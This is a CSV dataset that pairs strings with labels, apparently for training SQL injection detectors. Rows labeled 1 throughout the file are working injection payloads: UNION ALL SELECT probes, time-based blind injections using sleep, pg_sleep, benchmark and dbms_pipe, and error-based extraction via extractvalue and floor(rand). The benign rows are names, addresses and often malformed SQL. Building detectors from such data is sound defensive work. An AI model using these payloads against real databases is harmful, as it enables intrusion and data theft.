Query,Label
SELECT * FROM atom 3 SELECT * FROM immediately,0
1  )   where 9683  =  9683,1
47343175k,0
thuswald,0
SELECT TOP 50 PERCENT * FROM popular,0
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
quintanilla del coco,0
1'  )   where 2974  =  2974 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
ma$c3donio,0
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
carol,0
SELECT * FROM scale,0
SELECT * FROM face ORDER BY attack DESC,0
SELECT TOP 50 PERCENT * FROM sense,0
8.04948E+15,0
" SELECT * FROM section ORDER BY wing, himself",0
96804276j,0
SELECT COUNT ( your ) FROM while,0
biurrun-olcoz,0
crabe,0
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,0
kinsman,0
1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,1
 (  select 2527 from pg_sleep  (  5   )    ) ,1
"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
walter,0
SELECT * FROM region WHERE pattern LIKE '%take%',0
DELETE FROM wrong,0
rupp@djbroadcast.gov,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_link' LIMIT 1,0
1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1
"1  )   as ahfj where 4776  =  4776 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,1
2.21E+15,0
SELECT * FROM chosen WHERE importance = 'nest' LIMIT 3,0
SELECT run ( s )  FROM moment UNION,0
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1
isurieta llano,0
SELECT earn ( s )  FROM circle UNION ALL,0
resaca,0
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
elbeze,0
SELECT life FROM bar,0
"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM which WHERE glass = 'saw' FETCH FIRST 3 ROWS ONLY,0
"1%'  )   union all select null,null,null--",1
SELECT AVG ( Price ) FROM battle,0
chimenea,0
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'vjkf' like 'vjkf",1
albeta,0
SELECT * FROM glass WHERE slightly NOT LIKE '[cause]%',0
SELECT * FROM sum WHERE    NOT especially = 'opportunity',0
SELECT TOP 3 * FROM question SELECT * FROM gate 3SELECT * FROM goose,0
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",1
5.1284E+14,0
"   SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union  FROM highway",0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3146' LIMIT 1,0
"  SELECT MID ( ""SQL Tutorial"", 5, 3 )  AS ExtractString;",0
"1""  )   and 9198  =  9198--",1
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY,0
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",1
SELECT rose ( s FROM own RIGHT JOIN,0
SELECT sail ( s )  FROM mouse UNION ALL,0
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",1
1'   )    )    as xirr where 2425  =  2425,1
"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
-2100' where 9260  =  9260 or 3038  =  3038,1
SELECT * FROM wp_posts WHERE ID  =  262327 LIMIT 1,0
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1
1'||  (  select 'qdkb' where 4331  =  4331,1
DELETE FROM accurate WHERE lonely = 'cow',0
"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1
calle tras do colexio s/n,0
SELECT AVG ( widely ) FROM flame SELECT SUM ( nervous ) ,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",1
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",1
"1""  )   where 1416  =  1416 union all select null,null,null#",1
SELECT TOP 3 * FROM aloud,0
"  SELECT standard,factory,lying FROM receive LEFT JOIN Orders ON dangerous.circusID =  guess.sand ORDER BY us.stems",0
SELECT article ( s )  FROM easily LEFT JOIN,0
1103,0
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
SELECT * FROM cow WHERE root = 'every' LIMIT 3,0
3690,0
"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1
1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",1
SELECT * FROM place WHERE shape = 'opposite'  OR charge = 'jump',0
SELECT * FROM slowly,0
SELECT TOP 3 * FROM live SELECT * FROM dead 3SELECT * FROM road,0
SELECT COUNT ( nobody ) FROM coffee,0
62386870z,0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1
"  SELECT seeID AS ID, clock AS yesterday FROM grew",0
padiernos,0
SELECT * FROM grandfather WHERE beneath NOT BETWEEN 'began' AND 'ants',0
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%',0
9639,0
select * from users where id  =  1 <@.. or 1  =  1 -- 1,1
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1
"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1
"   SELECT exist, average, presentFROM certain WHERE person  IS NOT NULL",0
SELECT * FROM next FETCH FIRST 50 PERCENT ROWS ONLY,0
panter,0
c/ costa i llobera 83,0
persaud,0
SELECT AVG ( victory ) FROM teeth SELECT SUM ( cloud ) ,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",1
"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit )  VALUES  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )  ",0
SELECT * FROM heavy FETCH FIRST 50 PERCENT ROWS ONLY,0
" SELECT column_name ( s )  FROM natural,brother",0
SELECT machine,0
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward,0
rubi de biasi,0
"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT MIN ( whose )  AS whenever FROM sunlight,0
-4498  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2902  =  2902,1
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM standard FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM seeing,0
"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",1
"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
vilar elsegui,0
1'+  (  select tzvm where 5145  =  5145 and 4192  =  7437#,1
"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"SELECT * FROM right WHERE meant BETWEEN ""cotton"" AND    ""sort""",0
 )   or pg_sleep  (  __TIME__  )  --,1
SELECT * FROM vegetable WHERE by = 'wonderful' LIMIT 3,0
kaycee,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2766' LIMIT 1,0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1
6554,0
busoms redolad,0
" SELECT * FROM general ORDER BY clean ASC, supper DESC",0
SELECT * FROM pile WHERE safe = 'believed' LIMIT 3,0
"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT AVG ( Price ) FROM skill,0
"  SELECT nationID AS ID, bear AS silk FROM row",0
SELECT * FROM ProductsWHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',0
 UPDATE diagram SET ranch = 'its'WHERE statement = 'try',0
SELECT * FROM spider WHERE express = 'improve'  AND  ( wonderful = 'battle' OR gradually = 'west' ) ,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
"1   )    )    as gdcg where 2329  =  2329 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null--",1
SELECT * FROM fastened,0
"   SELECT rapidly, carefully, voyage FROM simply WHERE seems  IS NULL",0
"  SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose",0
"SELECT * FROM whom WHERE wait BETWEEN ""adventure"" AND    ""brave""",0
"  SELECT wentID AS ID, again AS lose FROM pair",0
"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",1
"1""  )   where 9285  =  9285 and 8506  =  8343#",1
SELECT * FROM  ( SELECT view FROM shallow ) ,0
WHERE ProductID  =  ANY  ( SELECT ProductID   FROM OrderDetails WHERE Quantity > 99 ) ;,0
SELECT agree ( s )  FROM shoot SELECT magic FROM statement,0
"1""  )   where 1705  =  1705",1
DELETE FROM hit,0
"   SELECT Employees.level, COUNT ( Orders.additionID )  AS circusFROM    ( OrdersINNER JOIN service ON Orders.southID  =  Employees.stairsID ) ",0
1'  )   as yxdb where 4597  =  4597,1
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,1
"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",1
amn,0
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0
"1   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   9914  =  9914",1
1' where 1593  =  1593,1
pontevedra,0
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm",1
"  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID",0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy",1
1366,0
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",1
SELECT DISTINCT too FROM thirty,0
1  )   as tykp where 6851  =  6851,1
"1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
prdena del rincn,0
" SELECT * FROM this ORDER BY older ASC, clearly DESC",0
zambrana,0
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_20_db_updated' LIMIT 1,0
de las muecas pedrol,0
"   SELECT poet, missing, common FROM reason WHERE doing  IS NULL",0
"   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL",0
SELECT * FROM spin WHERE NOT system = 'allow'  AND NOT law = 'current',0
dean,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2710,3175,3142,3021,3141,3139,2676,3086,3140,3088 )  ORDER BY meta_id ASC",0
dukes,0
"1%""  )   rlike sleep  (  5  )  #",1
22535,0
"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1
23215,0
SELECT find ( s ) FROM produce INNER JOIN,0
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""ksrh""  =  ""ksrh",1
"calle romeral, 143, 7?h",0
ars yermo,0
fluvia,0
SELECT highest ( s )  FROM taken UNION ALL,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
SELECT * FROM buy WHERE successful = 'cup',0
SELECT smaller FROM please UNION ALL SELECT weather FROM pattern ORDER BY course,0
robledollano,0
SELECT * FROM island FETCH FIRST 50 PERCENT ROWS ONLY,0
galland-charney@juanpolo.ch,0
"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT ACOS ( -0.8 ) ;,0
"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
SELECT determine ( s ) FROM excitement INNER JOIN,0
cycelia,0
SELECT again ( s )  FROM sets LEFT JOIN,0
sosa,0
SELECT * FROM [Brazil   Customers];,0
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0
4.85943E+15,0
SELECT extra ( s )  FROM have UNION ALL,0
" SELECT * FROM current ORDER BY planned, behavior",0
"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,1
" SELECT column_name ( s )  FROM gray,separate",0
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,1
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1
mejury8,0
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",1
rincn,0
"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT COUNT ( rope ) FROM total,0
19432,0
otorgamiento,0
aghi,0
mo3tren04,0
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",1
"  SELECT hurryID AS ID, modern AS broke FROM stage",0
alcalde gregorio espino 165,0
SELECT * FROM over 3 SELECT * FROM product,0
zalzale1,0
"1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1
"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
